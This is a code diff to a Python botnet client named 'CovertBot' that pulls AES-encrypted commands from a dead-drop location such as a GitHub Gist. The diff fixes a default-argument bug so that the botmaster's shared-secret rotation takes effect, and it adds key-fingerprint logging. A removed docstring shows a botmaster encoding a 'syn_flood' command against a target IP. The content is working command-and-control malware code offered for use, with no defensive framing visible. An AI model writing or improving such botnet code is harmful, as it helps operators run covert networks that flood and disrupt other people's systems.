@@ -246,15 +246,15 @@ def derive_iv(nonce: str) -> bytes:
 
 # ── Command encoding/decoding (botmaster side helper) ─────────
 
-def encode_command(cmd: dict, secret: bytes = SHARED_SECRET) -> str:
+def encode_command(cmd: dict, secret: bytes = None) -> str:
     """
     Encode a command dict for posting to the dead drop.
-    Returns: base64(IV + AES_CBC_encrypt(json(cmd)))
-    
-    Usage (botmaster):
-        payload = encode_command({"type": "syn_flood", "target": "192.168.100.20", "duration": 30})
-        # Paste payload string into GitHub Gist or raw file
+    Returns: base64(AES_CBC_encrypt(json(cmd)))
+
+    `secret` resolved at call time so update_secret() changes take effect.
     """
+    if secret is None:
+        secret = SHARED_SECRET
     key  = derive_key(secret)
     nonce = datetime.utcnow().strftime("%Y-%m-%d-%H")
     iv   = derive_iv(nonce)
@@ -264,11 +264,19 @@ def encode_command(cmd: dict, secret: bytes = SHARED_SECRET) -> str:
     blob = base64.b64encode(ciphertext).decode()
     return blob
 
-def decode_command(blob: str, secret: bytes = SHARED_SECRET) -> dict | None:
+def decode_command(blob: str, secret: bytes = None) -> dict | None:
     """
     Decode a command from the dead drop blob.
     Tries current hour and previous hour (clock skew tolerance).
+
+    `secret` defaults to the module-level SHARED_SECRET, resolved at *call*
+    time so that update_secret() changes take effect immediately.  Never use
+    a default-argument default (``secret=SHARED_SECRET``) here — Python
+    evaluates default args once at function-definition time, so a later
+    reassignment of SHARED_SECRET would be silently ignored.
     """
+    if secret is None:
+        secret = SHARED_SECRET   # read global at call time, not definition time
     key = derive_key(secret)
     try:
         ciphertext = base64.b64decode(blob)
@@ -604,7 +612,13 @@ class CovertBot:
             new_secret = cmd.get("secret", "").encode()
             if len(new_secret) >= 8:
                 SHARED_SECRET = new_secret
-                print(f"[COVERT] -> Shared secret updated")
+                # encode_command and decode_command both accept an explicit
+                # secret= argument; callers that omit it now pick up the
+                # updated global because we fixed the default-arg closure.
+                print(f"[COVERT] -> Shared secret updated "
+                      f"(new key: {derive_key(SHARED_SECRET).hex()[:8]}...)")
+            else:
+                print(f"[COVERT] -> update_secret ignored: secret too short (<8 chars)")
 
         else:
             print(f"[COVERT] -> Unknown command type: {cmd_type}")
